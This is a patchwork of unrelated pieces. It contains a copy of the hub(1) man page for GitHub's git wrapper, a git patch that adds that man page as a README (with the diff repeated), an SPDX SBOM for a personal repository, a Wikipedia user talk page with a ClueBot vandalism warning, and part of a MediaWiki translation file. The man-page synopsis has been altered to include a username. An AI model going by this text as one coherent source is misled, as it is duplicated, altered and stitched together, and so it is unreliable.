
hub(1)hub manualhub(1)
make git easier with GitHub
Synopsis
hub [--noop] COMMAND [OPTIONS]
hub alias [@Edgarruiz856-s] [SHELL]
hub help hub-COMMAND

Description
Hub is a tool that wraps git in order to extend it with extra functionality that makes it better when working with GitHub.

Commands
Available commands are split into two groups: those that are already present in git but that are extended through hub, and custom ones that hub provides.

Extended git commands
hub-am(1)
Replicate commits from a GitHub pull request locally.
hub-apply(1)
Download a patch from GitHub and apply it locally.
hub-checkout(1)
Check out the head of a pull request as a local branch.
hub-cherry-pick(1)
Cherry-pick a commit from a fork on GitHub.
hub-clone(1)
Clone a repository from GitHub.
hub-fetch(1)
Add missing remotes prior to performing git fetch.
hub-init(1)
Initialize a git repository and add a remote pointing to GitHub.
hub-merge(1)
Merge a pull request locally with a message like the GitHub Merge Button.
hub-push(1)
Push a git branch to each of the listed remotes.
hub-remote(1)
Add a git remote for a GitHub repository.
hub-submodule(1)
Add a git submodule for a GitHub repository.
New commands provided by hub
hub-alias(1)
Show shell instructions for wrapping git.
hub-api(1)
Low-level GitHub API request interface.
hub-browse(1)
Open a GitHub repository in a web browser.
hub-ci-status(1)
Display status of GitHub checks for a commit.
hub-compare(1)
Open a GitHub compare page in a web browser.
hub-create(1)
Create a new repository on GitHub and add a git remote for it.
hub-delete(1)
Delete a repository on GitHub.
hub-fork(1)
Fork the current repository on GitHub and add a git remote for it.
hub-gist(1)
Create and print GitHub Gists.
hub-pull-request(1)
Create a GitHub Pull Request.
hub-pr(1)
Manage GitHub Pull Requests for the current repository.
hub-issue(1)
Manage GitHub Issues for the current repository.
hub-release(1)
Manage GitHub Releases for the current repository.
hub-sync(1)
Fetch git objects from upstream and update local branches.
Conventions
Most hub commands are supposed to be run in a context of an existing local git repository. Hub will automatically detect the GitHub repository that the current working directory belongs to by scanning its git remotes.

In case there are multiple git remotes that are all pointing to GitHub, hub assumes that the main one is named "upstream", "github", or "origin", in that order of preference.

When working with forks, it's recommended that the git remote for your own fork is named "origin" and that the git remote for the upstream repository is named "upstream". See https://help.github.com/articles/configuring-a-remote-for-a-fork/

The default branch (usually "master") for the current repository is detected like so:

git symbolic-ref refs/remotes/origin/HEAD
where origin is the name of the git remote for the upstream repository.

The destination where the currently checked out branch is considered to be pushed to depends on the git config push.default setting. If the value is "upstream" or "tracking", the tracking information for a branch is read like so:

git rev-parse --symbolic-full-name BRANCH@{upstream}
Otherwise, hub scans git remotes to find the first one for which refs/remotes/REMOTE/BRANCH exists. The "origin", "github", and "upstream" remotes are searched last because hub assumes that it's more likely that the current branch is pushed to your fork rather than to the canonical repo.

Configuration
GitHub OAuth authentication
Hub will prompt for GitHub username & password the first time it needs to access the API and exchange it for an OAuth token, which it saves in ~/.config/hub.

To avoid being prompted, use GITHUB_USER and GITHUB_PASSWORD environment variables.

Alternatively, you may provide GITHUB_TOKEN, an access token with repo permissions. This will not be written to ~/.config/hub.

HTTPS instead of git protocol
If you prefer the HTTPS protocol for git operations, you can configure hub to generate all URLs with https: instead of git: or ssh::

$ git config --global hub.protocol https
This will affect clone, fork, remote add and other hub commands that expand shorthand references to GitHub repo URLs.

GitHub Enterprise
By default, hub will only work with repositories that have remotes which point to github.com. GitHub Enterprise hosts need to be whitelisted to configure hub to treat such remotes same as github.com:

$ git config --global --add hub.host MY.GIT.ORG
The default host for commands like init and clone is still github.com, but this can be affected with the GITHUB_HOST environment variable:

$ GITHUB_HOST=my.git.org git clone myproject
Environment variables
HUB_VERBOSE
If this environment variable is set, verbose logging will be printed to stderr.
HUB_CONFIG
The file path where hub configuration is read from and stored. If XDG_CONFIG_HOME is present, the default is $XDG_CONFIG_HOME/hub; otherwise it's $HOME/.config/hub. The configuration file is also searched for in XDG_CONFIG_DIRS per XDG Base Directory Specification.
HUB_PROTOCOL
One of "https", "ssh", or "git" as preferred protocol for git clone/push.
GITHUB_HOST
The GitHub hostname to default to instead of "github.com".
GITHUB_TOKEN
OAuth token to use for GitHub API requests.
GITHUB_USER
The GitHub username of the actor of GitHub API operations.
GITHUB_PASSWORD
The GitHub password used to exchange user credentials for an OAuth token that gets stored in hub configuration. If not set, it may be interactively prompted for on first run.
GITHUB_REPOSITORY
A value in "OWNER/REPO" format that specifies the repository that API operations should be performed against. Currently only used to infer the default value of GITHUB_USER for API requests.
Bugs
https://github.com/github/hub/issues

Authors
https://github.com/github/hub/contributors

See also
git(1), git-clone(1), git-remote(1), git-init(1), https://github.com/github/hub

hub version 2.14.205 Mar 2020
From 5c67ca40e9b3b14fdefccc1415ef1fb635b8fbed Mon Sep 17 00:00:00 2001
From: Edgar Manuel Ruiz Arias
 <127623263+Edgarruiz856@users.noreply.github.com>
Date: Fri, 21 Nov 2025 02:43:33 -0600
Subject: [PATCH] Create README.md

---
 README.md | 132 ++++++++++++++++++++++++++++++++++++++++++++++++++++++
 1 file changed, 132 insertions(+)
 create mode 100644 README.md

diff --git a/README.md b/README.md
new file mode 100644
index 0000000..daadb05
--- /dev/null
+++ b/README.md
@@ -0,0 +1,132 @@
+hub(1)hub manualhub(1)
+
+make git easier with GitHub
+Synopsis
+hub [--noop] COMMAND [OPTIONS]
+hub alias [@Edgarruiz856-s] [SHELL]
+hub help hub-COMMAND
+
+Description
+Hub is a tool that wraps git in order to extend it with extra functionality that makes it better when working with GitHub.
+
+Commands
+Available commands are split into two groups: those that are already present in git but that are extended through hub, and custom ones that hub provides.
+
+Extended git commands
+hub-am(1)
+Replicate commits from a GitHub pull request locally.
+hub-apply(1)
+Download a patch from GitHub and apply it locally.
+hub-checkout(1)
+Check out the head of a pull request as a local branch.
+hub-cherry-pick(1)
+Cherry-pick a commit from a fork on GitHub.
+hub-clone(1)
+Clone a repository from GitHub.
+hub-fetch(1)
+Add missing remotes prior to performing git fetch.
+hub-init(1)
+Initialize a git repository and add a remote pointing to GitHub.
+hub-merge(1)
+Merge a pull request locally with a message like the GitHub Merge Button.
+hub-push(1)
+Push a git branch to each of the listed remotes.
+hub-remote(1)
+Add a git remote for a GitHub repository.
+hub-submodule(1)
+Add a git submodule for a GitHub repository.
+New commands provided by hub
+hub-alias(1)
+Show shell instructions for wrapping git.
+hub-api(1)
+Low-level GitHub API request interface.
+hub-browse(1)
+Open a GitHub repository in a web browser.
+hub-ci-status(1)
+Display status of GitHub checks for a commit.
+hub-compare(1)
+Open a GitHub compare page in a web browser.
+hub-create(1)
+Create a new repository on GitHub and add a git remote for it.
+hub-delete(1)
+Delete a repository on GitHub.
+hub-fork(1)
+Fork the current repository on GitHub and add a git remote for it.
+hub-gist(1)
+Create and print GitHub Gists.
+hub-pull-request(1)
+Create a GitHub Pull Request.
+hub-pr(1)
+Manage GitHub Pull Requests for the current repository.
+hub-issue(1)
+Manage GitHub Issues for the current repository.
+hub-release(1)
+Manage GitHub Releases for the current repository.
+hub-sync(1)
+Fetch git objects from upstream and update local branches.
+Conventions
+Most hub commands are supposed to be run in a context of an existing local git repository. Hub will automatically detect the GitHub repository that the current working directory belongs to by scanning its git remotes.
+
+In case there are multiple git remotes that are all pointing to GitHub, hub assumes that the main one is named "upstream", "github", or "origin", in that order of preference.
+
+When working with forks, it's recommended that the git remote for your own fork is named "origin" and that the git remote for the upstream repository is named "upstream". See https://help.github.com/articles/configuring-a-remote-for-a-fork/
+
+The default branch (usually "master") for the current repository is detected like so:
+
+git symbolic-ref refs/remotes/origin/HEAD
+where origin is the name of the git remote for the upstream repository.
+
+The destination where the currently checked out branch is considered to be pushed to depends on the git config push.default setting. If the value is "upstream" or "tracking", the tracking information for a branch is read like so:
+
+git rev-parse --symbolic-full-name BRANCH@{upstream}
+Otherwise, hub scans git remotes to find the first one for which refs/remotes/REMOTE/BRANCH exists. The "origin", "github", and "upstream" remotes are searched last because hub assumes that it's more likely that the current branch is pushed to your fork rather than to the canonical repo.
+
+Configuration
+GitHub OAuth authentication
+Hub will prompt for GitHub username & password the first time it needs to access the API and exchange it for an OAuth token, which it saves in ~/.config/hub.
+
+To avoid being prompted, use GITHUB_USER and GITHUB_PASSWORD environment variables.
+
+Alternatively, you may provide GITHUB_TOKEN, an access token with repo permissions. This will not be written to ~/.config/hub.
+
+HTTPS instead of git protocol
+If you prefer the HTTPS protocol for git operations, you can configure hub to generate all URLs with https: instead of git: or ssh::
+
+$ git config --global hub.protocol https
+This will affect clone, fork, remote add and other hub commands that expand shorthand references to GitHub repo URLs.
+
+GitHub Enterprise
+By default, hub will only work with repositories that have remotes which point to github.com. GitHub Enterprise hosts need to be whitelisted to configure hub to treat such remotes same as github.com:
+
+$ git config --global --add hub.host MY.GIT.ORG
+The default host for commands like init and clone is still github.com, but this can be affected with the GITHUB_HOST environment variable:
+
+$ GITHUB_HOST=my.git.org git clone myproject
+Environment variables
+HUB_VERBOSE
+If this environment variable is set, verbose logging will be printed to stderr.
+HUB_CONFIG
+The file path where hub configuration is read from and stored. If XDG_CONFIG_HOME is present, the default is $XDG_CONFIG_HOME/hub; otherwise it's $HOME/.config/hub. The configuration file is also searched for in XDG_CONFIG_DIRS per XDG Base Directory Specification.
+HUB_PROTOCOL
+One of "https", "ssh", or "git" as preferred protocol for git clone/push.
+GITHUB_HOST
+The GitHub hostname to default to instead of "github.com".
+GITHUB_TOKEN
+OAuth token to use for GitHub API requests.
+GITHUB_USER
+The GitHub username of the actor of GitHub API operations.
+GITHUB_PASSWORD
+The GitHub password used to exchange user credentials for an OAuth token that gets stored in hub configuration. If not set, it may be interactively prompted for on first run.
+GITHUB_REPOSITORY
+A value in "OWNER/REPO" format that specifies the repository that API operations should be performed against. Currently only used to infer the default value of GITHUB_USER for API requests.
+Bugs
+https://github.com/github/hub/issues
+
+Authors
+https://github.com/github/hub/contributors
+
+See also
+git(1), git-clone(1), git-remote(1), git-init(1), https://github.com/github/hub
+
+hub version 2.14.205 Mar 2020
+by Edgar Manuel Ruiz Arias 
diff --git a/README.md b/README.md
new file mode 100644
index 0000000..daadb05
--- /dev/null
+++ b/README.md
@@ -0,0 +1,132 @@
+hub(1)hub manualhub(1)
+
+make git easier with GitHub
+Synopsis
+hub [--noop] COMMAND [OPTIONS]
+hub alias [@Edgarruiz856-s] [SHELL]
+hub help hub-COMMAND
+
+Description
+Hub is a tool that wraps git in order to extend it with extra functionality that makes it better when working with GitHub.
+
+Commands
+Available commands are split into two groups: those that are already present in git but that are extended through hub, and custom ones that hub provides.
+
+Extended git commands
+hub-am(1)
+Replicate commits from a GitHub pull request locally.
+hub-apply(1)
+Download a patch from GitHub and apply it locally.
+hub-checkout(1)
+Check out the head of a pull request as a local branch.
+hub-cherry-pick(1)
+Cherry-pick a commit from a fork on GitHub.
+hub-clone(1)
+Clone a repository from GitHub.
+hub-fetch(1)
+Add missing remotes prior to performing git fetch.
+hub-init(1)
+Initialize a git repository and add a remote pointing to GitHub.
+hub-merge(1)
+Merge a pull request locally with a message like the GitHub Merge Button.
+hub-push(1)
+Push a git branch to each of the listed remotes.
+hub-remote(1)
+Add a git remote for a GitHub repository.
+hub-submodule(1)
+Add a git submodule for a GitHub repository.
+New commands provided by hub
+hub-alias(1)
+Show shell instructions for wrapping git.
+hub-api(1)
+Low-level GitHub API request interface.
+hub-browse(1)
+Open a GitHub repository in a web browser.
+hub-ci-status(1)
+Display status of GitHub checks for a commit.
+hub-compare(1)
+Open a GitHub compare page in a web browser.
+hub-create(1)
+Create a new repository on GitHub and add a git remote for it.
+hub-delete(1)
+Delete a repository on GitHub.
+hub-fork(1)
+Fork the current repository on GitHub and add a git remote for it.
+hub-gist(1)
+Create and print GitHub Gists.
+hub-pull-request(1)
+Create a GitHub Pull Request.
+hub-pr(1)
+Manage GitHub Pull Requests for the current repository.
+hub-issue(1)
+Manage GitHub Issues for the current repository.
+hub-release(1)
+Manage GitHub Releases for the current repository.
+hub-sync(1)
+Fetch git objects from upstream and update local branches.
+Conventions
+Most hub commands are supposed to be run in a context of an existing local git repository. Hub will automatically detect the GitHub repository that the current working directory belongs to by scanning its git remotes.
+
+In case there are multiple git remotes that are all pointing to GitHub, hub assumes that the main one is named "upstream", "github", or "origin", in that order of preference.
+
+When working with forks, it's recommended that the git remote for your own fork is named "origin" and that the git remote for the upstream repository is named "upstream". See https://help.github.com/articles/configuring-a-remote-for-a-fork/
+
+The default branch (usually "master") for the current repository is detected like so:
+
+git symbolic-ref refs/remotes/origin/HEAD
+where origin is the name of the git remote for the upstream repository.
+
+The destination where the currently checked out branch is considered to be pushed to depends on the git config push.default setting. If the value is "upstream" or "tracking", the tracking information for a branch is read like so:
+
+git rev-parse --symbolic-full-name BRANCH@{upstream}
+Otherwise, hub scans git remotes to find the first one for which refs/remotes/REMOTE/BRANCH exists. The "origin", "github", and "upstream" remotes are searched last because hub assumes that it's more likely that the current branch is pushed to your fork rather than to the canonical repo.
+
+Configuration
+GitHub OAuth authentication
+Hub will prompt for GitHub username & password the first time it needs to access the API and exchange it for an OAuth token, which it saves in ~/.config/hub.
+
+To avoid being prompted, use GITHUB_USER and GITHUB_PASSWORD environment variables.
+
+Alternatively, you may provide GITHUB_TOKEN, an access token with repo permissions. This will not be written to ~/.config/hub.
+
+HTTPS instead of git protocol
+If you prefer the HTTPS protocol for git operations, you can configure hub to generate all URLs with https: instead of git: or ssh::
+
+$ git config --global hub.protocol https
+This will affect clone, fork, remote add and other hub commands that expand shorthand references to GitHub repo URLs.
+
+GitHub Enterprise
+By default, hub will only work with repositories that have remotes which point to github.com. GitHub Enterprise hosts need to be whitelisted to configure hub to treat such remotes same as github.com:
+
+$ git config --global --add hub.host MY.GIT.ORG
+The default host for commands like init and clone is still github.com, but this can be affected with the GITHUB_HOST environment variable:
+
+$ GITHUB_HOST=my.git.org git clone myproject
+Environment variables
+HUB_VERBOSE
+If this environment variable is set, verbose logging will be printed to stderr.
+HUB_CONFIG
+The file path where hub configuration is read from and stored. If XDG_CONFIG_HOME is present, the default is $XDG_CONFIG_HOME/hub; otherwise it's $HOME/.config/hub. The configuration file is also searched for in XDG_CONFIG_DIRS per XDG Base Directory Specification.
+HUB_PROTOCOL
+One of "https", "ssh", or "git" as preferred protocol for git clone/push.
+GITHUB_HOST
+The GitHub hostname to default to instead of "github.com".
+GITHUB_TOKEN
+OAuth token to use for GitHub API requests.
+GITHUB_USER
+The GitHub username of the actor of GitHub API operations.
+GITHUB_PASSWORD
+The GitHub password used to exchange user credentials for an OAuth token that gets stored in hub configuration. If not set, it may be interactively prompted for on first run.
+GITHUB_REPOSITORY
+A value in "OWNER/REPO" format that specifies the repository that API operations should be performed against. Currently only used to infer the default value of GITHUB_USER for API requests.
+Bugs
+https://github.com/github/hub/issues
+
+Authors
+https://github.com/github/hub/contributors
+
+See also
+git(1), git-clone(1), git-remote(1), git-init(1), https://github.com/github/hub
+
+hub version 2.14.205 Mar 2020

https://usercontent.irccloud-cdn.com/file/wV5dCgad
{"spdxVersion":"SPDX-2.3","dataLicense":"CC0-1.0","SPDXID":"SPDXRef-DOCUMENT","name":"com.github.Edgarruiz856/.github","documentNamespace":"https://spdx.org/spdxdocs/protobom/ba3dcee2-fddb-4107-ab2e-0e77658da87e","creationInfo":{"creators":["Tool: protobom-v0.0.0-20251113174742-69d60134dc28+dirty","Tool: GitHub.com-Dependency-Graph"],"created":"2025-11-13T23:19:31Z"},"packages":[{"name":"com.github.Edgarruiz856/.github","SPDXID":"SPDXRef-github-Edgarruiz856-.github-main-3bf3b8","versionInfo":"main","downloadLocation":"git+https://github.com/Edgarruiz856/.github","filesAnalyzed":false,"externalRefs":[{"referenceCategory":"PACKAGE-MANAGER","referenceType":"purl","referenceLocator":"pkg:github/Edgarruiz856/.github@main"}]}],"relationships":[{"spdxElementId":"SPDXRef-DOCUMENT","relatedSpdxElement":"SPDXRef-github-Edgarruiz856-.github-main-3bf3b8","relationshipType":"DESCRIBES"}]}
https://github.com/Edgarruiz856/Edgarruiz856/blob/main/README.md
https://github.com/Edgarruiz856/ficticio-octo-fiesta/blob/main/README.md

== Welcome! ==


Hi Edgar Manuel Ruiz Arias, and welcome to Wikipedia! Thank you for [[Special:Contributions/Edgar Manuel Ruiz Arias|your contributions]]. I hope you like it here and decide to stay. Our [[Help:Introduction|intro page]] provides helpful information for new users—please check it out! If you have any questions, you can get help from experienced editors at [[WP:Teahouse|the Teahouse]].  Happy editing! <!-- Template:W-short -->- [[User:OpalYosutebito|OpalYosutebito]] 『[[User talk:OpalYosutebito|talk]]』 『[[Special:Contributions/OpalYosutebito|articles I want to eat]]』 02:57, 22 September 2025 (UTC)

== October 2025 ==
[[File:Information.svg|left|25px|alt=]] Hello, and welcome to Wikipedia. This is a message letting you know that one or more of your recent edits to [[:Database right]] have been undone by an automated computer program called [[User:ClueBot NG|ClueBot NG]].
{{clear}}
* ClueBot NG makes very few mistakes, but it does happen. If you believe the change you made was constructive, please [[User:ClueBot NG#Information About False Positives|read about it]], [{{User:ClueBot NG/Warnings/FPReport|4430602}} report it here], remove this message from your talk page, and then make the edit again.
* If you need help, please see the [[Help:Introduction|Introduction to Wikipedia]], and if you can't find what you are looking for there, place {{Tld|Help me}} on [[Special:EditPage/User talk:Edgar Manuel Ruiz Arias|your talk page]] and someone will drop by to help.
* The following is the log entry regarding this message: [[Database right]] was [https://en.wikipedia.org/w/index.php?title=Database+right&diff=1315615246&oldid=1313889939 changed] by Edgarruiz856 [[Special:Contributions/Edgar Manuel Ruiz Arias|Edgar Manuel Ruiz Arias]] [[User:Edgar Manuel Ruiz Arias|(u)]] [[User talk:Edgar Manuel Ruiz Arias|(t)]] ANN scored at 0.960473 on 2025-10-07T17:41:27+00:00 <!-- MySQL ID: 4430602 -->
Thank you. <!-- Template:uw-cluebotwarning1 --><!-- Template:uw-vandalism1 --> [[User:ClueBot NG|ClueBot NG]] ([[User talk:ClueBot NG|talk]]) 17:41, 7 October 2025 (UTC)

:@[[User:ClueBot NG|ClueBot NG]] de acuerdo gracias [[User:Edgar Manuel Ruiz Arias|Edgar Manuel Ruiz Arias]] ([[User talk:Edgar Manuel Ruiz Arias#top|talk]]) 23:46, 7 October 2025 (UTC)
# Translation of New Developers/Introduction to the Wikimedia Technical Ecosystem to English (English)
# Exported from MediaWiki
#
msgid ""
msgstr ""
""
"PO-Revision-Date: 2023-04-09 11:33:45+0000\n"
"POT-Creation-Date: 2023-04-09 11:33:45+0000\n"
"Content-Type: text/plain; charset=UTF-8\n"
"Content-Transfer-Encoding: 8bit\n"
"Language: en\n"
"X-Generator: MediaWiki 1.41.0-wmf.3 (b2a9d4e); Translate 2023-01-24\n"
"X-Language-Code: en\n"
"X-Message-Group: page-New Developers/Introduction to the Wikimedia Technical Ecosystem\n"
"Plural-Forms: nplurals=2; plural=(n != 1);\n"

#
msgctxt "New_Developers/Introduction_to_the_Wikimedia_Technical_Ecosystem/Page_display_title"
msgid "New Developers/Introduction to the Wikimedia Technical Ecosystem"
msgstr "New Developers/Introduction to the Wikimedia Technical Ecosystem"

#
msgctxt "New_Developers/Introduction_to_the_Wikimedia_Technical_Ecosystem/1"
msgid "This page provides an overview of [$url Wikimedia] software and infrastructure for new technical contributors."
msgstr "This page provides an overview of [$url Wikimedia] software and infrastructure for new technical contributors."

#
msgctxt "New_Developers/Introduction_to_the_Wikimedia_Technical_Ecosystem/115"
msgid "Its goal is to help developers understand the major areas where you can apply your technical skills to help support and grow the [[$1|Movement]]."
msgstr "Its goal is to help developers understand the major areas where you can apply your technical skills to help support and grow the [[$1|Movement]]."

#
msgctxt "New_Developers/Introduction_to_the_Wikimedia_Technical_Ecosystem/2"
msgid "== Core principles and technology =="
msgstr "== Core principles and technology =="

#
msgctxt "New_Developers/Introduction_to_the_Wikimedia_Technical_Ecosystem/3"
msgid "=== Open source ==="
msgstr "=== Open source ==="

#
msgctxt "New_Developers/Introduction_to_the_Wikimedia_Technical_Ecosystem/4"
msgid "The Wikimedia technical ecosystem is guided by [[:en:Free_and_open-source_software|free and open source software]] (FLOSS) principles. Contributors around the world volunteer their time to maintain and extend the technology behind Wikimedia projects. This means that the Wikimedia technical ecosystem consists of many unique projects with varying contributing guidelines, design patterns, hosting locations, and code review processes."
msgstr "The Wikimedia technical ecosystem is guided by [[:en:Free_and_open-source_software|free and open source software]] (FLOSS) principles. Contributors around the world volunteer their time to maintain and extend the technology behind Wikimedia projects. This means that the Wikimedia technical ecosystem consists of many unique projects with varying contributing guidelines, design patterns, hosting locations, and code review processes."

#
msgctxt "New_Developers/Introduction_to_the_Wikimedia_Technical_Ecosystem/5"
msgid "Open source values like shared ownership and strong privacy commitments are central to Wikimedia's technical infrastructure, software, and services. For example:"
msgstr "Open source values like shared ownership and strong privacy commitments are central to Wikimedia's technical infrastructure, software, and services. For example:"

#
msgctxt "New_Developers/Introduction_to_the_Wikimedia_Technical_Ecosystem/6"
msgid "For version control and code review, the Wikimedia Foundation (WMF) uses [[$gerrit|Git and Gerrit]]. Git is a free and open source distributed version control system, and Gerrit is a free, web-based collaborative code review tool that integrates with Git."
msgstr "For version control and code review, the Wikimedia Foundation (WMF) uses [[$gerrit|Git and Gerrit]]. Git is a free and open source distributed version control system, and Gerrit is a free, web-based collaborative code review tool that integrates with Git."

#
msgctxt "New_Developers/Introduction_to_the_Wikimedia_Technical_Ecosystem/7"
msgid "[[$1|Wikimedia Cloud Services (WMCS)]] provides cloud computing infrastructure, shared hosting (platform as a service), and data services for contributors to Wikimedia software projects. You can use these services to host your software tools for the Wikimedia movement, for free, instead of using proprietary, paid, or non-open-source services."
msgstr "[[$1|Wikimedia Cloud Services (WMCS)]] provides cloud computing infrastructure, shared hosting (platform as a service), and data services for contributors to Wikimedia software projects. You can use these services to host your software tools for the Wikimedia movement, for free, instead of using proprietary, paid, or non-open-source services."

#
msgctxt "New_Developers/Introduction_to_the_Wikimedia_Technical_Ecosystem/8"
msgid "In addition to providing tools and services for technical contributors, WMF maintains [[$1|core infrastructure]] like data centers, search, networking, and global traffic routing. You don't need to learn about those in order to contribute to wiki projects, but you should know about the core software that powers Wikipedia and other wikis: MediaWiki."
msgstr "In addition to providing tools and services for technical contributors, WMF maintains [[$1|core infrastructure]] like data centers, search, networking, and global traffic routing. You don't need to learn about those in order to contribute to wiki projects, but you should know about the core software that powers Wikipedia and other wikis: MediaWiki."

#
msgctxt "New_Developers/Introduction_to_the_Wikimedia_Technical_Ecosystem/9"
msgid "=== MediaWiki ==="
msgstr "=== MediaWiki ==="

#
msgctxt "New_Developers/Introduction_to_the_Wikimedia_Technical_Ecosystem/10"
msgid "Wikimedia projects, including Wikipedia, run on the [[$mediawiki|MediaWiki]] software platform. MediaWiki is free and open source software, built specifically for collecting and organizing free and open knowledge. It's multilingual, extensible, customizable, and reliable. MediaWiki enables users around the world to edit, organize, maintain, and collaborate on wikis. It manages the display of content like text, photos, formatting, and revisions. MediaWiki is more than just a content management system: it also provides tools to handle spam and vandalism, and other functionality that supports community curation of freely-reusable knowledge on an open platform."
msgstr "Wikimedia projects, including Wikipedia, run on the [[$mediawiki|MediaWiki]] software platform. MediaWiki is free and open source software, built specifically for collecting and organizing free and open knowledge. It's multilingual, extensible, customizable, and reliable. MediaWiki enables users around the world to edit, organize, maintain, and collaborate on wikis. It manages the display of content like text, photos, formatting, and revisions. MediaWiki is more than just a content management system: it also provides tools to handle spam and vandalism, and other functionality that supports community curation of freely-reusable knowledge on an open platform."

#
msgctxt "New_Developers/Introduction_to_the_Wikimedia_Technical_Ecosystem/11"
msgid "Cool fact: [[$wmfblog-nasa|NASA uses MediaWiki as its wiki software.]]"
msgstr "Cool fact: [[$wmfblog-nasa|NASA uses MediaWiki as its wiki software.]]"

#
msgctxt "New_Developers/Introduction_to_the_Wikimedia_Technical_Ecosystem/12"
msgid "== Key areas where developers can contribute =="
msgstr "== Key areas where developers can contribute =="

#
msgctxt "New_Developers/Introduction_to_the_Wikimedia_Technical_Ecosystem/13"
msgid "=== Develop MediaWiki, apps, and extensions ==="
msgstr "=== Develop MediaWiki, apps, and extensions ==="

#
msgctxt "New_Developers/Introduction_to_the_Wikimedia_Technical_Ecosystem/14"
msgid "==== MediaWiki core and extensions ===="
msgstr "==== MediaWiki core and extensions ===="

#
msgctxt "New_Developers/Introduction_to_the_Wikimedia_Technical_Ecosystem/15"
msgid "The MediaWiki software is developed collaboratively by people from all around the world. The Wikimedia technical community has added many key features to MediaWiki and built a large ecosystem of extensions to the core software. Due to its complexity, contributing to MediaWiki may be more challenging than other types of technical contributions. As a new contributor, focus on features and bugs that only touch a small region of code. Avoid building new MediaWiki skins and extensions: every new extension adds to the software's overall maintenance burden, and can block the launch of new, crucial features."
msgstr "The MediaWiki software is developed collaboratively by people from all around the world. The Wikimedia technical community has added many key features to MediaWiki and built a large ecosystem of extensions to the core software. Due to its complexity, contributing to MediaWiki may be more challenging than other types of technical contributions. As a new contributor, focus on features and bugs that only touch a small region of code. Avoid building new MediaWiki skins and extensions: every new extension adds to the software's overall maintenance burden, and can block the launch of new, crucial features."

#
msgctxt "New_Developers/Introduction_to_the_Wikimedia_Technical_Ecosystem/116"
msgid "Instead, look into working on one of the many [[$1|existing extensions]]."
msgstr "Instead, look into working on one of the many [[$1|existing extensions]]."

#
msgctxt "New_Developers/Introduction_to_the_Wikimedia_Technical_Ecosystem/16"
msgid "Extension example: translate text and manage multilingual wikis"
msgstr "Extension example: translate text and manage multilingual wikis"

#
msgctxt "New_Developers/Introduction_to_the_Wikimedia_Technical_Ecosystem/17"
msgid "The [[$1|Translate extension]] enables localization of MediaWiki and translation of every kind of text."
msgstr "The [[$1|Translate extension]] enables localization of MediaWiki and translation of every kind of text."

#
msgctxt "New_Developers/Introduction_to_the_Wikimedia_Technical_Ecosystem/18"
msgid "It supports web-based translation, proofreading, and \ncollaboration between translators all over the world, while also making back-end integration with source code as easy as possible."
msgstr "It supports web-based translation, proofreading, and \ncollaboration between translators all over the world, while also making back-end integration with source code as easy as possible."

#
msgctxt "New_Developers/Introduction_to_the_Wikimedia_Technical_Ecosystem/19"
msgid "Screenshot of a translation page generated by the Translate extension."
msgstr "Screenshot of a translation page generated by the Translate extension."

#
msgctxt "New_Developers/Introduction_to_the_Wikimedia_Technical_Ecosystem/20"
msgid "Things to know before you start:"
msgstr "Things to know before you start:"

#
msgctxt "New_Developers/Introduction_to_the_Wikimedia_Technical_Ecosystem/21"
msgid "Writing code for MediaWiki generally requires knowledge of PHP, MySQL/MariaDB, JavaScript, and CSS."
msgstr "Writing code for MediaWiki generally requires knowledge of PHP, MySQL/MariaDB, JavaScript, and CSS."

#
msgctxt "New_Developers/Introduction_to_the_Wikimedia_Technical_Ecosystem/22"
msgid "The MediaWiki codebase is large – don't be overwhelmed by it! When you're first starting, aim to write features or fix bugs that only touch a small region of code."
msgstr "The MediaWiki codebase is large – don't be overwhelmed by it! When you're first starting, aim to write features or fix bugs that only touch a small region of code."

#
msgctxt "New_Developers/Introduction_to_the_Wikimedia_Technical_Ecosystem/23"
msgid "Follow the [[$1|MediaWiki development guidelines]] and [[$2|best practices for extensions]]."
msgstr "Follow the [[$1|MediaWiki development guidelines]] and [[$2|best practices for extensions]]."

#
msgctxt "New_Developers/Introduction_to_the_Wikimedia_Technical_Ecosystem/24"
msgid "To learn more, visit $become-a-hacker."
msgstr "To learn more, visit $become-a-hacker."

#
msgctxt "New_Developers/Introduction_to_the_Wikimedia_Technical_Ecosystem/25"
msgid "==== Wikimedia mobile apps ===="
msgstr "==== Wikimedia mobile apps ===="

#
msgctxt "New_Developers/Introduction_to_the_Wikimedia_Technical_Ecosystem/26"
msgid "Mobile apps expand the reach of Wikimedia content by allowing users to interact with Wikimedia without using a browser. There are apps for the Android, iOS, and KaiOS platforms, apps for different Wikimedia projects like Commons, Wikipedia, and Wiktionary, and apps for activities like reading, contributing, and more. Many apps have vibrant developer communities and welcome new contributors."
msgstr "Mobile apps expand the reach of Wikimedia content by allowing users to interact with Wikimedia without using a browser. There are apps for the Android, iOS, and KaiOS platforms, apps for different Wikimedia projects like Commons, Wikipedia, and Wiktionary, and apps for activities like reading, contributing, and more. Many apps have vibrant developer communities and welcome new contributors."

#
msgctxt "New_Developers/Introduction_to_the_Wikimedia_Technical_Ecosystem/27"
msgid "Mobile app example: read Wikipedia without internet access"
msgstr "Mobile app example: read Wikipedia without internet access"

#
msgctxt "New_Developers/Introduction_to_the_Wikimedia_Technical_Ecosystem/28"
msgid "$kiwix is an offline reader – it makes Wikipedia accessible to people without internet access."
msgstr "$kiwix is an offline reader – it makes Wikipedia accessible to people without internet access."

#
msgctxt "New_Developers/Introduction_to_the_Wikimedia_Technical_Ecosystem/29"
msgid "It provides content in more than 100 languages from Wikipedia, Wikiquote, Wiktionary, and other online resources."
msgstr "It provides content in more than 100 languages from Wikipedia, Wikiquote, Wiktionary, and other online resources."

#
msgctxt "New_Developers/Introduction_to_the_Wikimedia_Technical_Ecosystem/30"
msgid "Kiwix development uses Java/Kotlin (Android), Swift (iOS), Qt (desktop), NodeJS (mediawiki offliner) and C++."
msgstr "Kiwix development uses Java/Kotlin (Android), Swift (iOS), Qt (desktop), NodeJS (mediawiki offliner) and C++."

#
msgctxt "New_Developers/Introduction_to_the_Wikimedia_Technical_Ecosystem/31"
msgid "Kiwix flyer"
msgstr "Kiwix flyer"

#
msgctxt "New_Developers/Introduction_to_the_Wikimedia_Technical_Ecosystem/32"
msgid "Screenshot of Kiwix on iOS"
msgstr "Screenshot of Kiwix on iOS"

#
msgctxt "New_Developers/Introduction_to_the_Wikimedia_Technical_Ecosystem/33"
msgid "To learn more, visit $wikimedia-apps."
msgstr "To learn more, visit $wikimedia-apps."

#
msgctxt "New_Developers/Introduction_to_the_Wikimedia_Technical_Ecosystem/34"
msgid "=== Customize MediaWiki through on-wiki development ==="
msgstr "=== Customize MediaWiki through on-wiki development ==="

#
